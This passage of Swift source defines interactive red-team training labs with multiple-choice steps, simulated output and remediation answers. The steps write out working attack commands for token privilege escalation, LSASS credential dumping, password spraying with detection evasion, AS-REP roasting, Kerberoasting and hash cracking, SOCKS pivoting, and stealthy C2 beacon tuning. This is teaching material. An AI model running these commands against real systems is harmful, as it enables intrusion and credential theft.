                        LabOption("net user /add hacker Passw0rd! /domain", output: "System error 5 has occurred. Access is denied.", feedback: "You tried to create a domain account before even checking your privileges — noisy, and it failed because you're not privileged yet. Enumerate your token first with `whoami /priv`."),
                        LabOption("Download and run a kernel exploit immediately", output: "", feedback: "Kernel exploits risk bluescreening the host and are often patched. Check `whoami /priv` first — a service account almost always hands you SeImpersonate, a far more reliable path."),
                    ]),
                LabStep(
                    instruction: "`SeImpersonatePrivilege` is enabled. Which technique abuses it to reach SYSTEM on a modern server?",
                    hint: "You want a tool that coerces a privileged service to authenticate over a named pipe, then impersonates its token.",
                    options: [
                        LabOption(".\\PrintSpoofer.exe -i -c cmd", correct: true, output: "[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe connection... impersonated token\nC:\\> whoami\nnt authority\\system", feedback: "PrintSpoofer leverages SeImpersonate via a named pipe to grab a SYSTEM token and spawns an interactive SYSTEM `cmd`. Clean, reliable on modern Windows, and exactly the intended use of the privilege against the system."),
                        LabOption("Run Mimikatz sekurlsa::logonpasswords", output: "ERROR kuhl_m_sekurlsa: Handle on memory (0x00000005)", feedback: "Mimikatz needs SYSTEM (or debug) rights to read LSASS — which you don't have *yet*. It's a great next step *after* you escalate, not the escalation itself. Get SYSTEM via SeImpersonate first."),
                        LabOption("Exploit MS08-067 against localhost", output: "target not vulnerable (patched, modern OS)", feedback: "MS08-067 is a 2008 remote SMB bug, irrelevant to local token privesc on a modern server. The privilege you hold calls for a Potato-family impersonation, not an ancient remote exploit.")
                    ]),
                LabStep(
                    instruction: "You're SYSTEM and want credentials for lateral movement. What's the appropriate in-scope action now?",
                    hint: "SYSTEM unlocks tooling that failed earlier — reach for credentials, not for breaking the host's defences.",
                    options: [
                        LabOption("mimikatz sekurlsa::logonpasswords (works now as SYSTEM)", correct: true, output: "Authentication Id : ...\nUser Name         : svc_sql\nNTLM              : 8846f7eaee8fb117ad06bdd830b7586c   ← cached credential harvested", feedback: "As SYSTEM you can finally read LSASS, so the dump that failed earlier succeeds and yields cached credentials to pivot with. The natural, in-scope next objective."),
                        LabOption("Disable Defender and EDR across the domain", output: "(loud, broadly disruptive, and well beyond this host's scope)", feedback: "Tearing down the client's defences domain-wide is noisy, risky and almost never authorized — it also destroys the engagement's value. Harvest credentials quietly; don't dismantle their security."),
                        LabOption("shutdown /r /t 0 to prove you control the box", output: "(reboots the server — needless and disruptive)", feedback: "A reboot proves nothing a `whoami` doesn't and causes an outage. Never disrupt the host to demonstrate control.")
                    ]),
                LabStep(
                    instruction: "You're SYSTEM. The report needs the root-cause fix for this specific escalation.",
                    hint: "What privilege made it possible — and does this service truly need it?",
                    options: [
                        LabOption("Remove SeImpersonatePrivilege from the service account where it isn't required", correct: true, output: "fix: least-privilege the app-pool identity; SeImpersonate removed where unused  →  Potato path closed", feedback: "The escalation rode a privilege the service didn't need. Scoping the service account to least privilege (and using a dedicated low-priv identity) removes the Potato path at its root."),
                        LabOption("Disable the Print Spooler service", output: "PrintSpoofer uses a generic named pipe, not the spooler specifically", feedback: "Spooler-off helps against *some* coercion variants but PrintSpoofer doesn't strictly need the spooler, and other Potatoes don't either. The durable fix targets the enabling privilege, not one service."),
                        LabOption("Set a very long password on the service account", output: "", feedback: "No password was used — the escalation abused a token privilege, not a credential. Password length is irrelevant to SeImpersonate abuse; remove the unneeded privilege instead.")
                    ])
            ]),

        // MARK: 8 — Password spraying with lockout awareness (advanced)
        InteractiveLab(
            id: "lab-password-spray",
            title: "Spray without locking the client out",
            goal: "Find one valid credential on the client's SSO without tripping a single account lockout.",
            track: .redTeam,
            difficulty: .advanced,
            minutes: 7,
            scenario: "Your engagement authorizes password attacks against `corp.lab` SSO. The client's domain policy (which you asked for in the kickoff) locks an account after **5** bad attempts in a **30-minute** window. You have a list of 312 valid usernames from OSINT. Locking out real staff would be a serious, visible incident — and a professional failure.",
            debrief: "The whole craft of spraying is staying under the lockout threshold: vary the *username*, hold the *password* fixed, one attempt per account per window. The moment you prioritise speed over the client's account health, you cause an outage and torch trust. Defenders catch spraying by correlating one source authenticating to many users (and smart lockout / impossible-travel) — which is also why low-and-slow across rotating sources is what real operators do. One reused seasonal password is all it takes.",
            tools: ["kerbrute", "crackmapexec"],
            relatedLessonID: "red-password-attacks",
            steps: [
                LabStep(
                    instruction: "Kickoff gave you the lockout policy: 5 attempts / 30 min. Before spraying, what's the right first move?",
                    hint: "A single mistimed round can lock hundreds of staff. What do you verify, and what rate keeps every counter safe?",
                    options: [
                        LabOption("Plan ONE password per 30-min window, one attempt per account, and confirm the policy in writing", correct: true, output: "plan: 1 try/account per round · ≥35 min between rounds · threshold is 5/30min → max 1 counter used, never locks", feedback: "One attempt per account per lockout window means no single counter ever climbs past 1 of 5 — zero lockout risk. Confirming the policy in writing protects you and the client. This is the disciplined, correct approach."),
                        LabOption("Try the top 5 passwords against each account quickly to save time", output: "account lockouts: 180+ users locked — client helpdesk flooded, engagement escalated", feedback: "Five attempts hits the exact threshold and locks real staff en masse — a visible outage you caused. Speed is never worth locking out the client. This is precisely the loud mistake the lab exists to teach you to refuse."),
                        LabOption("Disable the lockout policy first so you can spray freely", output: "requires Domain Admin you don't have — and would be out of scope and reckless", feedback: "Weakening the client's security controls to make your attack easier is out of scope and dangerous — you'd leave them exposed. Work *within* the policy; that's what spraying is designed for.")
                    ]),
                LabStep(
                    instruction: "Plan set. Now cadence and source. How do you run the rounds to also dodge velocity / impossible-travel detection?",
                    hint: "Defenders alert on one source authenticating to many users fast. Spread it out and don't come from a single obvious origin.",
                    options: [
                        LabOption("Low and slow: one round per lockout window, rotating source IPs", correct: true, output: "schedule: 1 attempt/account every ~35 min · sources rotated across redirectors  →  under velocity thresholds", feedback: "Spacing rounds past the lockout-reset window and rotating sources keeps both per-account counters and one-source-to-many-users detections quiet. This is the operator's cadence."),
                        LabOption("All 312 accounts from one IP in a 10-second burst", output: "SIEM: one source → 312 auth attempts in 10s → high-confidence spray alert", feedback: "A single source hammering hundreds of accounts at once is the exact pattern spray detections are built for. Speed from one origin gets you caught immediately."),
                        LabOption("Parallelize several passwords at once to finish faster", output: "per-account counters climbing toward lockout — defeats the whole method", feedback: "Running multiple passwords concurrently pushes per-account counters up and risks the lockouts spraying exists to avoid. One password per window is the discipline.")
                    ]),
                LabStep(
                    instruction: "Pick the single password for round one. What sprays best against a corporate policy without guessing per-user?",
                    hint: "You want something that satisfies complexity rules yet many people actually choose — the same one across all 312 accounts.",
                    options: [
                        LabOption("Spray 'Spring2026!' across all 312 usernames, one try each", correct: true, output: "[+] VALID: frank@corp.lab : Spring2026!\n[*] 312 accounts · 1 hit · 0 lockouts", feedback: "A seasonal password meets most complexity policies while being a predictable human choice. One attempt per account kept every counter at 1 — one hit, zero lockouts. Textbook spray."),
                        LabOption("Spray a 16-char random string across all accounts", output: "0 hits · 0 lockouts (and nobody chooses this)", feedback: "No real user picks a random 16-char password, so you waste a whole safe window on a guess with near-zero hit rate. Spray what humans actually choose under a complexity policy."),
                        LabOption("Run all of rockyou.txt against frank@corp.lab", output: "account locked after 5 attempts", feedback: "That's brute force against one account — it hits the lockout threshold in seconds and locks frank out. Spraying is the opposite shape: one password, many accounts, one attempt each.")
                    ]),
                LabStep(
                    instruction: "You got `frank:Spring2026!`. Before using it, what's the careful operator move?",
                    hint: "Think about proving value while minimising noise and staying inside scope.",
                    options: [
                        LabOption("Validate the single credential quietly, note it, and pause spraying", correct: true, output: "crackmapexec smb corp.lab -u frank -p 'Spring2026!' → [+] corp\\frank:Spring2026! (valid logon, not admin)  · documented", feedback: "One quiet validation confirms the credential works, and you stop spraying now that you have a foothold — no need to keep risking windows. Document and move to using the access within scope."),
                        LabOption("Immediately spray 10 more passwords this same window to find more", output: "two accounts now at 2–3 failed attempts — risk climbing", feedback: "Stacking more passwords in the same window pushes counters toward lockout for no good reason — you already have a valid credential. Greedy spraying is how you lock people out late in an otherwise clean test."),
                        LabOption("Change frank's password so only you can use it", output: "would lock the real user out and is destructive/out of scope", feedback: "Changing a real employee's password is destructive, disrupts their work, and is almost never in scope. Use the credential as-is; never alter real accounts to 'secure' your access.")
                    ])
            ]),

        // MARK: 9 — AS-REP roasting (advanced)
        InteractiveLab(
            id: "lab-asrep-roast",
            title: "AS-REP roast a pre-auth-disabled account",
            goal: "Recover a domain account's password offline by abusing missing Kerberos pre-authentication.",
            track: .redTeam,
            difficulty: .advanced,
            minutes: 7,
            scenario: "You're on an internal AD engagement against `corp.local` (lab domain). You have network line-of-sight to the DC at 10.10.10.10 and a user list from earlier enumeration, but no valid domain credentials yet. You want a foothold credential the quiet way.",
            debrief: "AS-REP roasting abuses an account configured with 'Do not require Kerberos pre-authentication': the DC hands its AS-REP — encrypted with the user's password hash — to anyone who asks, even with no credentials. You crack it offline, so the DC logs almost nothing. Defenders remove the pre-auth exemption (it's rarely needed), give any exempt account a long random password, and alert on AS-REQ with no pre-auth (event 4768) for many users from one source.",
            tools: ["impacket", "hashcat"],
            relatedLessonID: "red-ad-attacks",
            steps: [
                LabStep(
                    instruction: "You have a username list but no password. Which accounts can you attack *without* any credential, and how do you find them?",
                    hint: "Pre-authentication normally gates this. Some accounts have it turned off — those are roastable by anyone.",
                    options: [
                        LabOption("GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.10", correct: true, output: "[*] svc_backup doesn't require pre-auth\n$krb5asrep$23$svc_backup@CORP.LOCAL:6f2a...   <-- crackable", feedback: "GetNPUsers queries each name for an AS-REP without pre-auth. `svc_backup` has pre-auth disabled, so the DC returned a crackable blob — and you needed no credentials at all."),
                        LabOption("GetUserSPNs.py corp.local/ -dc-ip 10.10.10.10", output: "[-] you must provide valid domain credentials", feedback: "That's Kerberoasting, which *requires* an authenticated user to request service tickets. You have no credentials yet — AS-REP roasting is the no-creds attack, so use GetNPUsers."),
                        LabOption("hydra -L users.txt -P rockyou.txt smb://10.10.10.10", output: "account lockouts imminent — very loud", feedback: "Online brute force against the DC is noisy and locks accounts. AS-REP roasting pulls a crackable hash with a single benign request per user and cracks offline — far quieter.")
                    ]),
                LabStep(
                    instruction: "You have `svc_backup`'s AS-REP hash. How do you recover the password?",
                    hint: "This is an offline job — pick the right hashcat mode for AS-REP.",
                    options: [
                        LabOption("hashcat -m 18200 asrep.txt rockyou.txt", correct: true, output: "$krb5asrep$23$svc_backup@CORP.LOCAL:...:Winter2026\nStatus...: Cracked", feedback: "Mode 18200 is AS-REP. The crack runs entirely on your box at GPU speed — `Winter2026` recovered, with no further DC interaction and no failed-logon noise on the domain."),
                        LabOption("hashcat -m 13100 asrep.txt rockyou.txt", output: "No hashes loaded (format mismatch)", feedback: "13100 is for Kerberoast TGS-REP hashes (`$krb5tgs$`), not AS-REP (`$krb5asrep$`). Matching the hash type to the mode matters — AS-REP is 18200."),
                        LabOption("Spray the cracked value online before cracking finishes", output: "nothing to spray yet — and it would be noisy", feedback: "There's nothing to spray until the offline crack returns a password, and online attempts add DC noise for no benefit. Let the quiet offline crack finish first.")
                    ]),
                LabStep(
                    instruction: "You recovered `svc_backup:Winter2026`. What's the careful way to turn it into a foothold?",
                    hint: "Confirm the single credential with minimal noise before building on it — and don't tamper with the account.",
                    options: [
                        LabOption("Validate the one credential quietly and document it", correct: true, output: "crackmapexec smb 10.10.10.10 -u svc_backup -p 'Winter2026' → [+] corp.local\\svc_backup (valid) · recorded", feedback: "A single quiet check confirms the credential works and gives you an authenticated foothold to continue (Kerberoasting is now on the table). Minimal noise, nothing altered."),
                        LabOption("Spray it across every host in the domain immediately", output: "dozens of logons from one source → noisy, and risks lockout where it mismatches", feedback: "Blasting the credential everywhere at once is loud and can trip lockouts on accounts it doesn't match. You already have a valid account — validate once and proceed deliberately."),
                        LabOption("Reset svc_backup's password so only you hold it", output: "(destructive — disrupts the service account and whatever runs as it)", feedback: "Resetting a live service account's password breaks the jobs that run as it and is almost always out of scope. Use the credential as-is.")
                    ]),
                LabStep(
                    instruction: "Report the fix. What most directly removes this finding for `svc_backup`?",
                    hint: "What property of the account let the DC hand you a crackable reply with no creds?",
                    options: [
                        LabOption("Re-enable Kerberos pre-authentication on the account (and give it a strong password)", correct: true, output: "fix: cleared 'Do not require preauth' on svc_backup + 25-char random password  →  AS-REP no longer issued pre-auth-free", feedback: "The DC only handed out the roastable AS-REP because pre-auth was disabled. Re-enabling it (it's rarely needed) stops the free hand-out, and a strong password defangs any residual offline attack."),
                        LabOption("Block port 88 at the firewall", output: "Kerberos breaks domain-wide — every logon fails", feedback: "Port 88 *is* Kerberos — blocking it breaks authentication for the whole domain. The fix is the per-account pre-auth setting, not disabling the protocol everyone relies on."),
                        LabOption("Rename svc_backup to something unguessable", output: "AS-REP still issued once the new name is learned", feedback: "Renaming is obscurity — once the new name surfaces in enumeration, the pre-auth-free AS-REP is still handed out. Re-enable pre-authentication to actually close it.")
                    ])
            ]),

        // MARK: 10 — SOCKS proxy pivot (advanced)
        InteractiveLab(
            id: "lab-socks-pivot",
            title: "Pivot into a hidden subnet over SOCKS",
            goal: "Reach an internal-only host through a compromised pivot without being reckless or loud.",
            track: .redTeam,
            difficulty: .advanced,
            minutes: 7,
            scenario: "On your lab range you've compromised `pivot` (10.10.10.8), a dual-homed box: reachable from your Kali, with a second NIC into 10.10.20.0/24 — a subnet you can't route to directly. Enumeration from the pivot hints that 10.10.20.5 runs something interesting. You hold valid SSH creds on the pivot.",
            debrief: "A pivot turns one foothold into a route: a dynamic SSH forward (`-D`) makes it a SOCKS proxy, and `proxychains` threads your tools through it into the hidden subnet. The careful operator goes targeted and slow — SYN scans don't survive SOCKS, full-subnet sweeps are slow and loud, and enumeration already told you where to look. Defenders spot pivots by watching for a server opening unusual outbound tunnels and internal scans originating from a host that shouldn't scan.",
            tools: ["ssh", "proxychains", "chisel"],
            relatedLessonID: "red-tunneling",
            steps: [
                LabStep(
                    instruction: "You want your tools to reach 10.10.20.5 *through* the pivot. Which forward sets that up with one command?",
                    hint: "You need arbitrary tools routed through the pivot, not just one port moved — that's the dynamic forward.",
                    options: [
                        LabOption("ssh -D 1080 user@10.10.10.8", correct: true, output: "SOCKS proxy listening on 127.0.0.1:1080  →  route tools via proxychains", feedback: "`-D` opens a dynamic SOCKS proxy on your box; anything you send through `127.0.0.1:1080` exits from the pivot into 10.10.20.0/24. One command, arbitrary tools — the standard pivot."),
                        LabOption("ssh -L 8080:10.10.20.5:80 user@10.10.10.8", output: "local :8080 now forwards to 10.10.20.5:80 only", feedback: "A local forward pulls *one* port to you — fine if you already knew you wanted 10.10.20.5:80, but you want to enumerate the host's services. A dynamic SOCKS proxy routes all your tools, not a single port."),
                        LabOption("ssh -R 9000:localhost:4444 user@10.10.10.8", output: "pivot :9000 now forwards back to your :4444", feedback: "A remote forward pushes a service from you *out* to the pivot — useful for catching callbacks, not for reaching into the internal subnet. You want `-D` for an inbound pivot.")
                    ]),
                LabStep(
                    instruction: "Proxy up. Now enumerate 10.10.20.5 through it. Which scan actually works over SOCKS *and* keeps noise down?",
                    hint: "SOCKS carries full TCP connections, not raw packets — and you already have a lead on which host matters.",
                    options: [
                        LabOption("proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.10.20.5", correct: true, output: "[proxychains] ...1080...10.10.20.5:445 OK\n445/tcp open  microsoft-ds\n3389/tcp open  ms-wbt-server", feedback: "`-sT` (full TCP connect) is the scan that survives SOCKS, `-Pn` skips ping that won't tunnel, and a short targeted port list on the one host enumeration flagged keeps it quiet and quick."),
                        LabOption("proxychains nmap -sS -T4 10.10.20.0/24", output: "all ports show filtered/garbage — SYN scan broken over SOCKS", feedback: "SYN scans need raw packets SOCKS can't carry, so `-sS` returns garbage, and sweeping the whole /24 at `-T4` is slow and loud through a tunnel. Use `-sT` against the specific host you have a lead on."),
                        LabOption("proxychains nmap -A -p- 10.10.20.0/24", output: "…still running after 40 minutes, extremely noisy", feedback: "Aggressive scripts and a full-port sweep of the entire subnet over a tunnel is painfully slow and lights up any internal monitoring. Target the host and ports enumeration pointed you to — restraint is the skill here."),
                    ]),
                LabStep(
                    instruction: "445 and 3389 are open on 10.10.20.5. What's the disciplined next action through the proxy?",
                    hint: "You have creds from the pivot. Enumerate the specific services you found rather than widening the blast radius.",
                    options: [
                        LabOption("proxychains crackmapexec smb 10.10.20.5 -u svc -p ... to check that one host", correct: true, output: "[proxychains] ...1080...10.10.20.5:445 OK\nSMB  10.10.20.5  [+] corp\\svc   ← valid logon (no admin), enumerating shares", feedback: "You enumerate the specific open service on the one host your scan flagged, through the proxy, with credentials you already hold. Targeted and quiet — follow the lead, don't widen it."),
                        LabOption("proxychains msfconsole → autopwn the whole subnet", output: "dozens of exploits fired over a slow tunnel — loud and unreliable", feedback: "Autopwn over SOCKS is slow, unreliable (many exploits mishandle proxied sockets) and extremely noisy. Enumerate the service you found before throwing exploits."),
                        LabOption("Re-scan 10.10.20.0/24 fully now that the proxy works", output: "another slow, noisy sweep of the whole subnet", feedback: "You already have a concrete target and open ports. Re-sweeping the subnet just adds tunnelled noise — act on the lead you have.")
                    ]),
                LabStep(
                    instruction: "SSH to the pivot isn't always available on a real engagement. Which tool pivots through a firewall that only lets out HTTP(S)?",
                    hint: "You want a tunnel that rides ordinary web traffic when inbound SSH is blocked.",
                    options: [
                        LabOption("chisel — reverse HTTP/WebSocket tunnel to your listener", correct: true, output: "chisel server -p 8080 --reverse (you) · chisel client 8080 R:socks (pivot)  →  SOCKS over HTTP", feedback: "Chisel tunnels a SOCKS proxy over HTTP/WebSocket, so it slips through egress that only permits web traffic — the go-to when SSH is unavailable. ligolo-ng and sshuttle fill similar roles."),
                        LabOption("telnet to the internal host directly", output: "no route to host (10.10.20.5 unreachable from Kali)", feedback: "You still can't route to the internal subnet directly — that's the whole reason you're pivoting. You need a tunnel through the pivot, not a direct connection that can't exist."),
                        LabOption("Open a new inbound firewall rule on the pivot", output: "requires admin on the firewall and is loud/out of scope", feedback: "Reconfiguring the client's firewall is intrusive, usually out of scope, and conspicuous. Tunnel out over an allowed protocol (chisel over HTTP) instead of changing their controls.")
                    ])
            ]),

        // MARK: 11 — Kerberoasting (expert)
        InteractiveLab(
            id: "lab-kerberoast",
            title: "Kerberoast a service account to Domain Admin",
            goal: "Crack an over-privileged service account's password offline, quietly, from a single domain user.",
            track: .redTeam,
            difficulty: .expert,
            minutes: 7,
            scenario: "Internal AD engagement on `corp.local` (lab). You've recovered one low-privileged domain credential, `jdoe:Passw0rd`. The client's detection team is active during this test, so noise matters. You want privileged access without firing an exploit.",
            debrief: "Kerberoasting abuses Kerberos by design: any authenticated user can request a service ticket for an account with an SPN, and part of that ticket is encrypted with the service account's hash — crackable offline. The quiet operator targets specific SPNs rather than mass-requesting, and cracks locally so the DC logs almost nothing. Defenders use long random passwords on service accounts (gMSAs), keep them out of privileged groups, and alert on one account requesting many TGS tickets (event 4769) with RC4.",
            tools: ["impacket", "hashcat"],
            relatedLessonID: "red-kerberoasting",
            steps: [
                LabStep(
                    instruction: "With `jdoe`'s creds, how do you find service accounts worth roasting while generating the least noise?",
                    hint: "A detection team is watching. Enumerate SPNs first; request tickets deliberately, not for everything at once.",
                    options: [
                        LabOption("GetUserSPNs.py corp.local/jdoe:Passw0rd -dc-ip 10.10.10.10", correct: true, output: "ServicePrincipalName      Name       MemberOf\nMSSQLSvc/sql01:1433       svc_mssql  Domain Admins\nHTTP/web01                svc_web    (none)", feedback: "Listing SPNs first (no `-request` yet) shows which accounts exist and their groups — quietly. `svc_mssql` is in Domain Admins: that's your single high-value target, so you can request just its ticket."),
                        LabOption("GetUserSPNs.py corp.local/jdoe:Passw0rd -request  (grab every ticket)", output: "requested 47 TGS tickets in 2 seconds → event 4769 x47 from one account", feedback: "Mass-requesting every SPN at once is a textbook detection: dozens of 4769 events from one user in seconds. Enumerate first, then request only the ticket(s) that matter — deliberate beats greedy when defenders are watching."),
                        LabOption("Run Mimikatz on the DC to dump service hashes", output: "requires code execution + admin on the DC you don't have", feedback: "You have one low-priv user, not DC admin — you can't run Mimikatz there. Kerberoasting needs nothing more than that user to request a ticket; use the supported feature, not an impossible step.")
                    ]),
                LabStep(
                    instruction: "`svc_mssql` is a Domain Admin with an SPN. Request *its* ticket specifically and save the hash.",
                    hint: "Target the one account, not all of them, and write the crackable blob to a file.",
                    options: [
                        LabOption("GetUserSPNs.py corp.local/jdoe:Passw0rd -request-user svc_mssql -outputfile tgs.txt", correct: true, output: "$krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/sql01... saved to tgs.txt  (1 x 4769, RC4)", feedback: "One targeted request yields exactly the ticket you want with a single 4769 event — minimal footprint. The TGS is encrypted with svc_mssql's hash, now sitting in tgs.txt for offline cracking."),
                        LabOption("Brute-force svc_mssql's password against the DC login", output: "failed logons mounting; lockout and alerts triggered", feedback: "Online guessing against the DC is loud and risks lockout — the opposite of Kerberoasting's appeal. The point is to pull a crackable hash with one benign request and attack it offline."),
                        LabOption("-request every SPN again to be thorough", output: "47 more 4769 events — detection team paged", feedback: "You already know svc_mssql is the Domain Admin target; re-requesting everything just manufactures noise. Precision is the expert move here.")
                    ]),
                LabStep(
                    instruction: "Crack the ticket. Which command recovers the service password offline?",
                    hint: "Kerberoast hashes (`$krb5tgs$`) have their own hashcat mode.",
                    options: [
                        LabOption("hashcat -m 13100 tgs.txt rockyou.txt", correct: true, output: "$krb5tgs$23$*svc_mssql*...:Summer2023!\nStatus...: Cracked\n# svc_mssql ∈ Domain Admins → effective DA", feedback: "Mode 13100 is Kerberoast (RC4 TGS-REP). It runs on your box with zero DC interaction — `Summer2023!` recovered. Since svc_mssql is a Domain Admin, you now have DA-level access, silently."),
                        LabOption("hashcat -m 18200 tgs.txt rockyou.txt", output: "No hashes loaded (format mismatch)", feedback: "18200 is AS-REP (`$krb5asrep$`), a different attack. A Kerberoast TGS-REP (`$krb5tgs$`) is mode 13100 — match the mode to the hash type."),
                        LabOption("Replay the TGS against sql01 to log in without cracking", output: "the TGS authenticates you to the service AS jdoe, not as svc_mssql", feedback: "The ticket you hold authenticates *you* to the service; it doesn't grant svc_mssql's identity. The value is the encrypted blob — crack it offline to recover the account's password.")
                    ]),
                LabStep(
                    instruction: "Remediation. What most directly defangs Kerberoasting for `svc_mssql`?",
                    hint: "The attack always ends in offline cracking — attack that assumption.",
                    options: [
                        LabOption("Give it a long random password (gMSA) and remove it from Domain Admins", correct: true, output: "fix: convert to gMSA (25+ char auto-rotated) + drop from Domain Admins  →  TGS uncrackable, blast radius gone", feedback: "A 25+ character random password (as gMSAs provide and rotate automatically) makes the recovered hash effectively uncrackable, and removing it from Domain Admins means even a crack wouldn't be catastrophic. Both halves matter."),
                        LabOption("Disable Kerberos and use NTLM only", output: "NTLM is weaker and relayable — strictly worse", feedback: "Falling back to NTLM trades one problem for a worse one (relay, no mutual auth). The fix is strong service-account passwords and least privilege, not abandoning Kerberos."),
                        LabOption("Block any user from requesting service tickets", output: "breaks normal service authentication domain-wide", feedback: "Every service logon needs TGS requests — blocking them breaks the domain. You can't remove the feature; you make the recovered hash useless with a strong, rotated password.")
                    ])
            ]),

        // MARK: 12 — C2 beacon traffic shaping (expert)
        InteractiveLab(
            id: "lab-c2-beacon",
            title: "Shape a C2 beacon to hide in the noise",
            goal: "Configure an implant on your lab range to blend into normal web traffic instead of being obvious.",
            track: .redTeam,
            difficulty: .expert,
            minutes: 7,
            scenario: "On your own closed lab range you're running an open-source C2 (Sliver) with a listener on `c2.lab` and an implant on a VM you own. Your task is to tune the beacon so it resembles ordinary HTTPS traffic — the OPSEC decisions a real operator makes — and understand how the blue team still finds it.",
            debrief: "A beacon's periodic check-in is both its strength and its tell. Long sleeps with heavy jitter, HTTPS to a plausible redirector, and a malleable profile mimicking a real app push the implant toward the noise floor — but even then, beacon-analysis spots the residual rhythm, and newly-registered domains, rare certificates and odd process→network behaviour betray it. You tuned for stealth *and* learned why the C2 channel is often where defenders catch the whole intrusion.",
            tools: ["sliver", "wireshark"],
            relatedLessonID: "red-c2",
            steps: [
                LabStep(
                    instruction: "First design decision: the check-in interval. A default implant beacons every 5 seconds on the dot. What do you set for a stealthy long-haul implant?",
                    hint: "Defenders fingerprint regularity. Think about how a clock-perfect fast callback looks on a timeline.",
                    options: [
                        LabOption("Long sleep with heavy jitter, e.g. --seconds 3600 --jitter 1800", correct: true, output: "beacon: check-in every 3600s ± 1800s  →  callbacks scattered across 30–90 min, no fixed clock", feedback: "A long base interval means few callbacks to notice, and large jitter smears them off any fixed clock, defeating simple 'phones home every N seconds' detections. Note Sliver's `--jitter` is **seconds, not a percentage** — the default of 30 would be ±30s on an hour-long sleep, barely any smear at all. This is the OPSEC-aware choice for persistence."),
                        LabOption("Beacon every 1 second for responsiveness", output: "beacon: 1s fixed → a perfect metronome on the netflow timeline", feedback: "A 1-second fixed interval is maximally responsive and maximally obvious — a flat, regular signal that beacon-analysis flags instantly. Responsiveness is not worth that visibility for a long-haul implant."),
                        LabOption("No sleep — hold a persistent open connection", output: "long-lived session to c2.lab stands out immediately", feedback: "A constant open connection is exactly what beaconing exists to avoid — a single long-lived session to an unusual host is trivially spotted. Periodic, jittered check-ins blend far better.")
                    ]),
                LabStep(
                    instruction: "Now the channel. Which carrier best hides the beacon in a typical corporate environment?",
                    hint: "You want traffic that looks like what the host already does all day.",
                    options: [
                        LabOption("HTTPS to a plausible domain behind a redirector", correct: true, output: "implant → https://cdn-assets.c2.lab (redirector) → team server  →  looks like ordinary TLS web traffic", feedback: "HTTPS blends into the sea of web traffic every host generates, and a redirector hides the real team server behind trusted-looking infrastructure. Encryption also denies defenders payload inspection."),
                        LabOption("Plaintext HTTP on port 4444", output: "cleartext C2 on an odd port — IDS signatures fire on the payload", feedback: "Cleartext lets an IDS read your traffic and match C2 signatures, and port 4444 is a Metasploit cliché. That's the opposite of blending in."),
                        LabOption("Raw TCP on a random high port", output: "unusual port + unknown protocol = anomaly flag", feedback: "An unknown protocol on a random high port is an anomaly a NIDS and netflow baseline will surface. Ride a protocol the environment expects — HTTPS — instead of inventing a conspicuous one.")
                    ]),
                LabStep(
                    instruction: "Your lab is a closed range you own. Before any of this touches infrastructure, what's the operator's non-negotiable check?",
                    hint: "This is the step that separates a professional from a criminal, regardless of how good the tradecraft is.",
                    options: [
                        LabOption("Confirm the C2 domains and targets are in the signed scope and isolated to the lab", correct: true, output: "scope check: c2.lab + implant VM are lab-only, authorized in writing  →  proceed", feedback: "Standing up C2 only ever happens against authorized, scoped infrastructure. Confirming the range is isolated and in-scope is the decision that makes everything after it legitimate — never skip it."),
                        LabOption("Point the implant at a real company's domain to test realism", output: "out of scope and illegal — do not", feedback: "Beaconing to or through infrastructure you don't own and aren't authorized for is illegal and unethical, no matter how instructive it would be. Keep everything inside your own authorized range."),
                        LabOption("Harvest real users' browsing to copy their traffic patterns", output: "capturing third-party traffic without consent is out of scope", feedback: "Mimicking realistic traffic is good tradecraft, but sourcing it from real people's browsing without consent crosses the ethical and legal line. Build profiles from your own test traffic."),
                    ]),
                LabStep(
                    instruction: "Finally, flip perspective: despite your tuning, how does the blue team most reliably catch this beacon?",
                    hint: "Jitter hides the clock, but it doesn't erase the underlying pattern.",
                    options: [
                        LabOption("Beacon analysis — statistics still surface the residual periodicity", correct: true, output: "SIEM: host → cdn-assets.c2.lab, 48 connections over 36h, inter-arrival clusters despite jitter → flagged", feedback: "Even with jitter, repeated check-ins leave a statistical rhythm that beacon-analysis detects, especially paired with a newly-registered domain and a rare certificate. The C2 channel is often exactly where defenders unravel the whole intrusion."),
                        LabOption("By cracking your HTTPS encryption in transit", output: "modern TLS isn't broken in transit; they don't need to", feedback: "Defenders don't break your TLS — they don't have to. The *metadata* (who talks to whom, how often, to what kind of domain) gives the beacon away regardless of encryption."),
                        LabOption("Antivirus signature on the beacon's network packets", output: "encrypted traffic defeats payload signatures; this isn't how beacons are caught", feedback: "Payload signatures can't see into encrypted traffic, which is why they're not the reliable catch. Behavioural beacon-analysis on the connection pattern is.")
                    ])
            ])
    ]
}
